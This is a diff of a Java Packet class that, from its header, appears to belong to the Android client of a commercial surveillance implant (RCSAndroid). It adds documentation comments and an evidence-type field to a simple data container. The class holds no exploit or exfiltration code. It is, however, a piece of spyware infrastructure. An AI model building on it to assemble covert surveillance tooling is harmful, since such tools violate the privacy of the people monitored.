@@ -1,51 +1,150 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : Packet.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI;
 
+import com.ht.RCSAndroidGUI.evidence.EvidenceType;
+
+// TODO: Auto-generated Javadoc
+/**
+ * The Class Packet.
+ */
 public class Packet {
-	private int type, command, priority;
-	private long id;
+
+	/** The type. */
+	EvidenceType type;
+
+	/** The priority. */
+	private int command, priority;
+
+	/** The id. */
+	private final long id;
+
+	/** The data. */
 	private byte[] data;
-	
-	public Packet(long unique) {
-		type = 0;
+
+	/** The data. */
+	private byte[] additional;
+
+	/**
+	 * Instantiates a new packet.
+	 * 
+	 * @param unique
+	 *            the unique
+	 */
+	public Packet(final long unique) {
+		type = EvidenceType.NONE;
 		command = 0;
 		id = unique;
 		data = null;
 	}
-	
+
+	/**
+	 * Gets the id.
+	 * 
+	 * @return the id
+	 */
 	public long getId() {
 		return id;
 	}
-	
-	public void setCommand(int c) {
+
+	/**
+	 * Sets the command.
+	 * 
+	 * @param c
+	 *            the new command
+	 */
+	public void setCommand(final int c) {
 		command = c;
 	}
-	
+
+	/**
+	 * Gets the command.
+	 * 
+	 * @return the command
+	 */
 	public int getCommand() {
 		return command;
 	}
 
-	public void setPriority(int p) {
+	/**
+	 * Sets the priority.
+	 * 
+	 * @param p
+	 *            the new priority
+	 */
+	public void setPriority(final int p) {
 		priority = p;
 	}
-	
+
+	/**
+	 * Gets the priority.
+	 * 
+	 * @return the priority
+	 */
 	public int getPriority() {
 		return priority;
 	}
 
 	// Needed only when sending LOG_CREATE
-	public void setType(int t) {
-		type = t;
+	/**
+	 * Sets the type.
+	 * 
+	 * @param evidenceType
+	 *            the new type
+	 */
+	public void setType(final EvidenceType evidenceType) {
+		type = evidenceType;
 	}
-	
-	public int getType() {
+
+	/**
+	 * Gets the type.
+	 * 
+	 * @return the type
+	 */
+	public EvidenceType getType() {
 		return type;
 	}
-	
-	public void fill(byte[] d) {
+
+	/**
+	 * Fill.
+	 * 
+	 * @param d
+	 *            the d
+	 */
+	public void fill(final byte[] d) {
 		data = d;
 	}
-	
+
+	/**
+	 * Peek.
+	 * 
+	 * @return the byte[]
+	 */
 	public byte[] peek() {
 		return data;
+	}
+
+	/**
+	 * Gets the additional.
+	 *
+	 * @return the additional
+	 */
+	public byte[] getAdditional() {
+		return additional;
+	}
+
+	/**
+	 * Sets the additional.
+	 *
+	 * @param d the new additional
+	 */
+	public void setAdditional(final byte[] d) {
+		additional = d;
 	}
 }
